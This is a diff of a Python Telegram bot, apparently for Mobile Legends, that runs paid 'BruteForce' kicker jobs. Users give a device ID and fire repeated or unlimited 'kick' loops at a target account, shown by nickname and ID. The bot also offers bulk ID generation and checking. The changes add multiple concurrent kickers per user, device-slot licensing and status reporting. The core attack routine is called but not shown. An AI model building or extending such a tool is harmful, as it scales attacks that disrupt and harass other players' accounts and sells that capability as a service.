+                    f"⚡ Last latency: {lat:.0f}ms\n"
+                    f"🚀 Speed: {speed:.2f}/s\n"
+                    f"📡 Last: {desc}\n\n"
                     f"Press 🛑 STOP to cancel."
                 )
                 try:
@@ -2028,7 +2496,7 @@ class MLBBBot:
                 summary = await run_kick_loop(
                     profile, total_loops, delay_sec,
                     progress_cb=progress_cb,
-                    cancel_check=lambda: cancel_flag.get(user_id, True)
+                    cancel_check=lambda: cancel_flag.get(key, True)
                 )
             except Exception as e:
                 logger.error(f"Kicker error: {e}")
@@ -2036,9 +2504,11 @@ class MLBBBot:
                     await context.bot.send_message(chat_id, f"❌ Kicker error: {e}")
                 except Exception:
                     pass
-                self.bf_cancel_flags.pop(user_id, None)
-                self.bf_running.pop(user_id, None)
-                self.bf_tasks.pop(user_id, None)
+                self.bf_cancel_flags.pop(key, None)
+                self.bf_running.pop(key, None)
+                self.bf_tasks.pop(key, None)
+                # Free up device slot on error too
+                key_manager.remove_user_device(user_id, device_id)
                 return
 
             duration = summary['duration']
@@ -2053,7 +2523,7 @@ class MLBBBot:
                 f"⚡ Avg latency: {summary['avg_latency']:.1f}ms\n"
                 f"🚀 Speed: {summary['speed']:.2f} kick/s\n"
             )
-            restart_kb = [[InlineKeyboardButton("🔁 Restart", callback_data="bf_mode_10")]]
+            restart_kb = [[InlineKeyboardButton("🔁 Restart", callback_data=f"bf_10|{dev_short}")]]
             try:
                 await context.bot.edit_message_text(
                     chat_id=chat_id,
@@ -2069,69 +2539,109 @@ class MLBBBot:
             except Exception:
                 pass
 
-            self.bf_cancel_flags.pop(user_id, None)
-            self.bf_running.pop(user_id, None)
-            self.bf_tasks.pop(user_id, None)
+            self.bf_cancel_flags.pop(key, None)
+            self.bf_running.pop(key, None)
+            self.bf_tasks.pop(key, None)
+            # ── FREE UP THE DEVICE SLOT ──
+            key_manager.remove_user_device(user_id, device_id)
+            logger.info(f"Freed device slot for user {user_id}: {device_id[:30]}...")
 
         task = asyncio.create_task(_runner())
-        self.bf_tasks[user_id] = task
+        self.bf_tasks[key] = task
 
     async def bfstatus_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
-        self._bf_is_active(user_id)
+        total_active = self._count_active_kickers()
 
-        st = self.bf_running.get(user_id)
-        task = self.bf_tasks.get(user_id)
-        active = st is not None and task is not None and not task.done()
+        user_kickers = []
+        for (uid, did), task in list(self.bf_tasks.items()):
+            if uid != user_id:
+                continue
+            if task and not task.done():
+                st = self.bf_running.get((uid, did))
+                if st:
+                    user_kickers.append(st)
+            else:
+                self.bf_tasks.pop((uid, did), None)
+                self.bf_running.pop((uid, did), None)
 
-        if not active:
+        max_devices = key_manager.get_device_limit(user_id)
+        active_devices = key_manager.get_device_count(user_id)
+
+        if not user_kickers:
             await update.message.reply_text(
                 "📊 Kicker Status\n"
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                "🟢 No active kicker.\n\n"
+                "🟢 Your kickers: NONE ACTIVE\n"
+                f"🌐 Global active kickers: {total_active}\n"
+                f"📱 Concurrent limit: {active_devices}/{max_devices}\n\n"
                 "Use /bf <device_id> to start one."
             )
             return
 
-        elapsed = time.time() - st['started_at']
-        total_loops = st['total_loops']
-        loop_str = f"{st['count']}/{total_loops}" if total_loops > 0 else f"{st['count']}/∞"
-        loop_label = f"{total_loops:,} loops" if total_loops > 0 else "Unlimited"
-        profile = st.get('profile', {})
-        speed = (st['count'] / elapsed) if elapsed > 0 else 0.0
-        succ_pct = (st['success'] / st['count'] * 100) if st['count'] > 0 else 0.0
-
-        text = (
+        lines = [
             f"📊 Kicker Status\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🟢 Status: ACTIVE\n"
-            f"👤 Target: {profile.get('nickname', 'Unknown')} "
-            f"(ID: {profile.get('account_id', '?')})\n"
-            f"🌐 Server: {profile.get('gs_info', '?')}\n"
-            f"🎯 Mode: {loop_label} | Delay {st['delay']}s\n\n"
-            f"🔄 Loop: {loop_str}\n"
-            f"✅ Success: {st['success']:,} ({succ_pct:.1f}%)\n"
-            f"❌ Failed: {st['failed']:,}\n"
-            f"⚡ Last latency: {st['last_latency']:.0f}ms\n"
-            f"🚀 Speed: {speed:.2f} kick/s\n"
-            f"⏱ Elapsed: {int(elapsed // 60)}m {int(elapsed % 60)}s\n\n"
-            f"Use /stop_bf to stop it."
-        )
-        await update.message.reply_text(text)
+            f"🟢 Active Kickers: {len(user_kickers)}/{max_devices}\n"
+            f"🌐 Global: {total_active}\n"
+            f"📱 Concurrent: {active_devices}/{max_devices}\n"
+        ]
+
+        for i, st in enumerate(user_kickers, 1):
+            elapsed = time.time() - st['started_at']
+            total_loops = st['total_loops']
+            loop_str = f"{st['count']}/{total_loops}" if total_loops > 0 else f"{st['count']}/∞"
+            profile = st.get('profile', {})
+            speed = (st['count'] / elapsed) if elapsed > 0 else 0.0
+            succ_pct = (st['success'] / st['count'] * 100) if st['count'] > 0 else 0.0
+
+            if total_loops > 0 and st['count'] > 0 and speed > 0:
+                remaining = total_loops - st['count']
+                eta = remaining / speed
+                eta_str = f"{int(eta // 60)}m {int(eta % 60)}s"
+            else:
+                eta_str = "N/A"
+
+            lines.append(
+                f"\n━━━ #{i} ━━━\n"
+                f"👤 {profile.get('nickname', 'Unknown')} "
+                f"(ID: {profile.get('account_id', '?')})\n"
+                f"🔄 Loop: {loop_str}\n"
+                f"✅ {st['success']:,} ({succ_pct:.1f}%) | ❌ {st['failed']:,}\n"
+                f"⚡ Last: {st['last_latency']:.0f}ms | 🚀 {speed:.2f}/s\n"
+                f"📡 {st.get('last_status', 'N/A')}\n"
+                f"⏱ {int(elapsed // 60)}m {int(elapsed % 60)}s | ⏳ {eta_str}"
+            )
+
+        lines.append("\n\nUse /stop_bf to stop all kickers.")
+        await update.message.reply_text("\n".join(lines))
 
     async def stop_bf_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
-        if user_id in self.bf_cancel_flags:
-            self.bf_cancel_flags[user_id] = True
-            await update.message.reply_text("🛑 Stop signal sent.")
+        stopped = 0
+        for (uid, did), flag in list(self.bf_cancel_flags.items()):
+            if uid == user_id:
+                self.bf_cancel_flags[(uid, did)] = True
+                stopped += 1
+        if stopped > 0:
+            await update.message.reply_text(f"🛑 Stop signal sent to {stopped} kicker(s).")
         else:
             await update.message.reply_text("ℹ️ No active kicker to stop.")
+
+    # ────────────────────────────────────────────────────────────────
+    # MESSAGE HANDLER
+    # ────────────────────────────────────────────────────────────────
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
 
         if context.user_data.get('bf_custom') and update.message.text:
             context.user_data['bf_custom'] = False
+            device_id = context.user_data.get('bf_custom_device')
+            context.user_data['bf_custom_device'] = None
+            if not device_id:
+                await update.message.reply_text("❌ Session expired. Use /bf <device_id> again.")
+                return
             try:
                 parts = update.message.text.strip().split()
                 loops = int(parts[0]) if parts else 10
@@ -2140,19 +2650,21 @@ class MLBBBot:
                     loops = 0
                 if delay < 0:
                     delay = 0.0
-                profile = self.bf_profiles.get(user_id)
+                profile = self.bf_profiles.get((user_id, device_id))
                 if not profile:
                     await update.message.reply_text("❌ Session expired. Use /bf <device_id> again.")
                     return
 
+                key = (user_id, device_id)
+
                 async with self.bf_running_lock:
-                    if self._bf_is_active(user_id):
+                    if self._bf_is_active(user_id, device_id):
                         await update.message.reply_text(
-                            "⚠️ You already have a kicker running! Use /stop_bf first."
+                            "⚠️ You already have a kicker running for this device! Use /stop_bf first."
                         )
                         return
-                    self.bf_cancel_flags[user_id] = False
-                    self.bf_running[user_id] = {
+                    self.bf_cancel_flags[key] = False
+                    self.bf_running[key] = {
                         'started_at': time.time(),
                         'total_loops': loops,
                         'delay': delay,
@@ -2163,6 +2675,9 @@ class MLBBBot:
                         'last_update': 0.0,
                         'status': 'active',
                         'profile': profile,
+                        'last_status': 'Initializing...',
+                        'device_id': device_id,
+                        'user_id': user_id,
                     }
                 cancel_flag = self.bf_cancel_flags
 
@@ -2178,19 +2693,22 @@ class MLBBBot:
                 async def _custom_runner():
                     state = {'last': 0.0}
 
-                    async def progress_cb(count, success_count, fail_count, lat):
-                        st = self.bf_running.get(user_id)
+                    async def progress_cb(count, success_count, fail_count, lat, desc):
+                        st = self.bf_running.get(key)
                         if st is not None:
                             st['count'] = count
                             st['success'] = success_count
                             st['failed'] = fail_count
                             st['last_latency'] = lat
                             st['last_update'] = time.time()
+                            st['last_status'] = desc
 
                         if time.time() - state['last'] < 2.0:
                             return
                         state['last'] = time.time()
                         loop_str = f"{count}/{loops}" if loops > 0 else f"{count}/∞"
+                        speed = count / (time.time() - st['started_at']) if st and (time.time() - st['started_at']) > 0 else 0
+                        succ_pct = (success_count / count * 100) if count > 0 else 0
                         try:
                             await context.bot.edit_message_text(
                                 chat_id=chat_id, message_id=msg_id,
@@ -2199,9 +2717,11 @@ class MLBBBot:
                                     f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                     f"👤 {profile['nickname']} (ID: {profile['account_id']})\n"
                                     f"🔄 Loop: {loop_str}\n"
-                                    f"✅ Success: {success_count}\n"
+                                    f"✅ Success: {success_count} ({succ_pct:.1f}%)\n"
                                     f"❌ Failed: {fail_count}\n"
-                                    f"⚡ Last latency: {lat:.0f}ms\n\n"
+                                    f"⚡ Last latency: {lat:.0f}ms\n"
+                                    f"🚀 Speed: {speed:.2f}/s\n"
+                                    f"📡 Last: {desc}\n\n"
                                     f"Send /stop_bf to cancel."
                                 )
                             )
@@ -2214,7 +2734,7 @@ class MLBBBot:
                         summary = await run_kick_loop(
                             profile, loops, delay,
                             progress_cb=progress_cb,
-                            cancel_check=lambda: cancel_flag.get(user_id, True)
+                            cancel_check=lambda: cancel_flag.get(key, True)
                         )
                     except Exception as e:
                         logger.error(f"Custom kicker error: {e}")
@@ -2222,9 +2742,10 @@ class MLBBBot:
                             await context.bot.send_message(chat_id, f"❌ Kicker error: {e}")
                         except Exception:
                             pass
-                        self.bf_cancel_flags.pop(user_id, None)
-                        self.bf_running.pop(user_id, None)
-                        self.bf_tasks.pop(user_id, None)
+                        self.bf_cancel_flags.pop(key, None)
+                        self.bf_running.pop(key, None)
+                        self.bf_tasks.pop(key, None)
+                        key_manager.remove_user_device(user_id, device_id)
                         return
 
                     duration = summary['duration']
@@ -2242,12 +2763,15 @@ class MLBBBot:
                         ))
                     except Exception:
                         pass
-                    self.bf_cancel_flags.pop(user_id, None)
-                    self.bf_running.pop(user_id, None)
-                    self.bf_tasks.pop(user_id, None)
+                    self.bf_cancel_flags.pop(key, None)
+                    self.bf_running.pop(key, None)
+                    self.bf_tasks.pop(key, None)
+                    # ── FREE UP THE DEVICE SLOT ──
+                    key_manager.remove_user_device(user_id, device_id)
+                    logger.info(f"Freed device slot for user {user_id}: {device_id[:30]}...")
 
                 task = asyncio.create_task(_custom_runner())
-                self.bf_tasks[user_id] = task
+                self.bf_tasks[key] = task
             except (ValueError, IndexError):
                 await update.message.reply_text(
                     "❌ Invalid format. Send: <loops> <delay>\nExample: 200 1.5"
@@ -2288,6 +2812,10 @@ class MLBBBot:
             await status_msg.edit_text(f"✅ Loaded {len(ids):,} IDs. Starting...")
             context.user_data['mode'] = None
             asyncio.create_task(self.run_check_task(update, context, ids, 'file'))
+
+    # ────────────────────────────────────────────────────────────────
+    # BULK CHECK TASK
+    # ────────────────────────────────────────────────────────────────
 
     async def run_check_task(self, update: Update, context: ContextTypes.DEFAULT_TYPE, data, mode: str):
         user_id = update.effective_user.id
@@ -2458,6 +2986,10 @@ class MLBBBot:
             self.active_tasks[user_id]['done'] = True
             self.live_stats.pop(user_id, None)
 
+    # ────────────────────────────────────────────────────────────────
+    # CALLBACK HANDLER
+    # ────────────────────────────────────────────────────────────────
+
     async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
         user_id = query.from_user.id
@@ -2470,6 +3002,33 @@ class MLBBBot:
                 await self.generate(update, context)
             elif data == "my_status":
                 await self.my_status(update, context)
+            elif data == "my_devices":
+                await query.answer()
+                max_devices = key_manager.get_device_limit(user_id)
+                active_devices = key_manager.get_user_devices(user_id)
+                lifetime_devices = key_manager.get_lifetime_devices(user_id)
+                active_count = self._bf_user_active_count(user_id)
+
+                if not active_devices:
+                    active_list = "  No active devices."
+                else:
+                    active_list = "\n".join(
+                        f"  {i}. {d[:60]}..." if len(d) > 60 else f"  {i}. {d}"
+                        for i, d in enumerate(active_devices, 1)
+                    )
+
+                await query.edit_message_text(
+                    f"📱 My Bruteforce Devices\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"Concurrent Limit: {len(active_devices)}/{max_devices}\n"
+                    f"Remaining Slots: {max(0, max_devices - len(active_devices))}\n"
+                    f"⚡ Active Kickers: {active_count}\n\n"
+                    f"Active Devices:\n{active_list}\n\n"
+                    f"📜 Lifetime History: {len(lifetime_devices)} device(s)",
+                    reply_markup=InlineKeyboardMarkup(
+                        [[InlineKeyboardButton("◀ Back", callback_data="back_main")]]
+                    )
+                )
             elif data == "admin_panel":
                 await self.admin_panel(update, context)
             elif data == "admin_genkey":
@@ -2478,6 +3037,8 @@ class MLBBBot:
                 await self.admin_listkeys_panel(update, context)
             elif data == "admin_listusers":
                 await self.admin_listusers_panel(update, context)
+            elif data == "admin_devlimits":
+                await self.admin_devlimits_panel(update, context)
             elif data == "bf_help":
                 await query.answer()
                 await query.edit_message_text(
@@ -2487,31 +3048,83 @@ class MLBBBot:
                     "The bot will verify the device ID, then show you "
                     "mode options (10x, 50x, 100x, unlimited, custom).\n\n"
                     "Commands:\n"
-                    "• /bfstatus — Show current kicker status\n"
-                    "• /stop_bf — Stop active kicker\n\n"
+                    "• /bfstatus — Show all your active kickers\n"
+                    "• /stop_bf — Stop ALL your kickers\n"
+                    "• /mydevices — Show your device limit\n\n"
+                    "📱 You can run MULTIPLE kickers at once up to your "
+                    "concurrent device limit.\n"
+                    "Stopping a kicker FREES UP a slot.\n"
+                    "Contact admin to increase your limit.",
+                    reply_markup=InlineKeyboardMarkup(
+                        [[InlineKeyboardButton("◀ Back", callback_data="back_main")]]
+                    )
                 )
-            elif data == "bf_stop":
-                if user_id in self.bf_cancel_flags:
-                    self.bf_cancel_flags[user_id] = True
+            elif data.startswith("bf_stp|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found. Try /stop_bf.", show_alert=True)
+                    return
+                key = (user_id, device_id)
+                if key in self.bf_cancel_flags:
+                    self.bf_cancel_flags[key] = True
                     await query.answer("🛑 Stopping...", show_alert=False)
                 else:
-                    await query.answer("ℹ️ No active kicker.", show_alert=False)
-            elif data == "bf_mode_single":
-                await self.bf_start_kick(update, context, total_loops=1, delay_sec=0.0)
-            elif data == "bf_mode_10":
-                await self.bf_start_kick(update, context, total_loops=10, delay_sec=2.0)
-            elif data == "bf_mode_50":
-                await self.bf_start_kick(update, context, total_loops=50, delay_sec=1.0)
-            elif data == "bf_mode_100":
-                await self.bf_start_kick(update, context, total_loops=100, delay_sec=0.5)
-            elif data == "bf_mode_inf":
-                await self.bf_start_kick(update, context, total_loops=0, delay_sec=0.2)
-            elif data == "bf_mode_custom":
-                if self._bf_is_active(user_id):
+                    await query.answer("ℹ️ No active kicker for this device.", show_alert=False)
+            elif data.startswith("bf_s|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found.", show_alert=True)
+                    return
+                await self.bf_start_kick(update, context, total_loops=1, delay_sec=0.0, device_id=device_id)
+            elif data.startswith("bf_10|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found.", show_alert=True)
+                    return
+                await self.bf_start_kick(update, context, total_loops=10, delay_sec=2.0, device_id=device_id)
+            elif data.startswith("bf_50|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found.", show_alert=True)
+                    return
+                await self.bf_start_kick(update, context, total_loops=50, delay_sec=1.0, device_id=device_id)
+            elif data.startswith("bf_100|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found.", show_alert=True)
+                    return
+                await self.bf_start_kick(update, context, total_loops=100, delay_sec=0.5, device_id=device_id)
+            elif data.startswith("bf_inf|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found.", show_alert=True)
+                    return
+                await self.bf_start_kick(update, context, total_loops=0, delay_sec=0.2, device_id=device_id)
+            elif data.startswith("bf_cus|"):
+                dev_short = data.split("|", 1)[1]
+                dev_map = context.user_data.get('bf_device_map', {})
+                device_id = dev_map.get(dev_short)
+                if not device_id:
+                    await query.answer("❌ Device not found.", show_alert=True)
+                    return
+                if self._bf_is_active(user_id, device_id):
                     await query.answer("⚠️ Kicker already running! Use /stop_bf.", show_alert=True)
                     return
                 await query.answer()
                 context.user_data['bf_custom'] = True
+                context.user_data['bf_custom_device'] = device_id
                 await query.edit_message_text(
                     "🛠️ Custom Mode\n"
                     "Send: <loops> <delay_seconds>\n"
@@ -2534,6 +3147,7 @@ class MLBBBot:
                     keyboard.append([InlineKeyboardButton("📁 Check from File", callback_data="check_file")])
                     keyboard.append([InlineKeyboardButton("🎲 Generate & Check", callback_data="generate")])
                     keyboard.append([InlineKeyboardButton("⚡ BruteForce", callback_data="bf_help")])
+                    keyboard.append([InlineKeyboardButton("📱 My Devices", callback_data="my_devices")])
                 if is_admin:
                     keyboard.append([InlineKeyboardButton("🔑 Admin Panel", callback_data="admin_panel")])
                 keyboard.append([InlineKeyboardButton("📋 My Status", callback_data="my_status")])
@@ -2618,6 +3232,14 @@ def main():
     application.add_handler(CommandHandler("bf", bot.bf_cmd))
     application.add_handler(CommandHandler("bfstatus", bot.bfstatus_cmd))
     application.add_handler(CommandHandler("stop_bf", bot.stop_bf_cmd))
+    application.add_handler(CommandHandler("mydevices", bot.mydevices_cmd))
+    # Admin device limit commands
+    application.add_handler(CommandHandler("setdevlimit", bot.setdevlimit_cmd))
+    application.add_handler(CommandHandler("adddevlimit", bot.adddevlimit_cmd))
+    application.add_handler(CommandHandler("checkdevlimit", bot.checkdevlimit_cmd))
+    application.add_handler(CommandHandler("resetdevlimit", bot.resetdevlimit_cmd))
+    application.add_handler(CommandHandler("listdevlimits", bot.listdevlimits_cmd))
+    application.add_handler(CommandHandler("activekickers", bot.activekickers_cmd))
     application.add_handler(CallbackQueryHandler(bot.button_callback))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
     application.add_handler(MessageHandler(filters.Document.ALL, bot.handle_message))
